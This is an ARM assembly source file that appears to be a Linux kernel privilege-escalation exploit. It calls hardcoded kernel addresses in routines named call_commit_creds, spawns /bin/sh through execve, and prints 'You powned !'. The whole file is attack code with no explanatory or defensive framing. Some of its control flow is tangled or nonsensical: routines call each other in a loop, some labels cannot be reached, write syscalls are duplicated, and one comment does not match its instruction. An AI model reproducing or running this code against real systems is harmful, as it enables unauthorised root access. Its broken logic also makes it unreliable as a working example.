.section .text
.global _start
.code 32
_start:
    ldr r0, =string
    mov r1, #10
    bl write_r0_to_stdout
    bl get_pc_arm

branch:
    mov r7, #0xdf
    mov r0, #1
    mov r1, #42
    mov r2, lr
    ldr r3, =0x8000e860
    svc 0
    mov r7, #0xdf
    svc 0
    ldr r0, =string2
    mov r1, #17
    bl write_r0_to_stdout
    bl exit

write_r0_to_stdout:
    MOV R7, #4
    MOV R2, R1
    MOV R1, R0
    MOV R0, #1
    push {r1, r2, r0}
    SWI 0
    MOV R7, #4
    pop {r1, r2, r0}
    SWI 0
    MOV PC, LR

write_r0_to_stdout_no_ret:
    MOV R7, #4
    MOV R2, R1
    MOV R1, R0
    MOV R0, #1
    push {r1, r2, r0}
    SWI 0
    MOV R7, #4
    pop {r1, r2, r0}
    push {r1, r2, r0}
    ldr r1, =binsh
    SWI 0
    mov r0, #0
    push {r0}
    ldr r0, =binsh
    push {r0}
    mov r1, sp
    sub r2, r2, r2
    mov r7, #11
    svc 0
    MOV R7, #4
    pop {r0, r1}
    pop {r1, r2, r0}
    SWI 0
    MOV R7, #1
    SWI 0
    pop {pc}

exit:
    MOV R7, #1
    SWI 0

system:
    mov     r0, pc        // We place the address of pc in r0
    add     r0, #20       // and add 10 to it (which then makes it point to //bin/sh)
    str     r0, [sp, #4]  // we place it on the stack  (in case we need it again)
    add     r1, sp, #4    // we move what was on the stack to r1
    sub     r2, r2, r2    // we subtract r2 from itself (which is the same as placing 0 in r2)
    mov     r7, #11       // syscall execve in r7
    svc     0             // we execute

get_pc_arm:
    bl branch

call_commit_creds_arm:
    sub r4, r4, r4
    mov r0, r4
    ldr r2, =0x800420c4
    bx r2
    ldr r2, =0x80042148
    bx r2
    ldr r0, =string3
    mov r1, #13
    mov r2, pc
    add r2, r2, #6
    push {r2}
    bl write_r0_to_stdout_no_ret
    mov r2, pc
    add r2, r2, #6
    push {r2}
    bl write_r0_to_stdout_no_ret
    bl system
    mov r1, #30
    bl write_r0_to_stdout
    bl exit

.ascii "//bin/sh\x00\x00"

.thumb
.thumb_func
get_pc:
    blx branch

call_commit_creds:
    sub r4, r4, r4
    mov r0, r4
    ldr r2, =0x800420c4
    blx r2
    ldr r2, =0x80042148
    blx r2
    ldr r0, =string3
    mov r1, #13
    mov r2, pc
    add r2, r2, #6
    push {r2}
    blx write_r0_to_stdout_no_ret
    mov r2, pc
    add r2, r2, #6
    push {r2}
    blx write_r0_to_stdout_no_ret
    blx system
    mov r1, #30
    blx write_r0_to_stdout
    bl exit

.data
string:
    .ascii "Hey man !\n"
string2:
    .ascii "You not powned !\n"
string3:
    .ascii "You powned !\n"
binsh:
    .ascii "/bin/sh\x00"
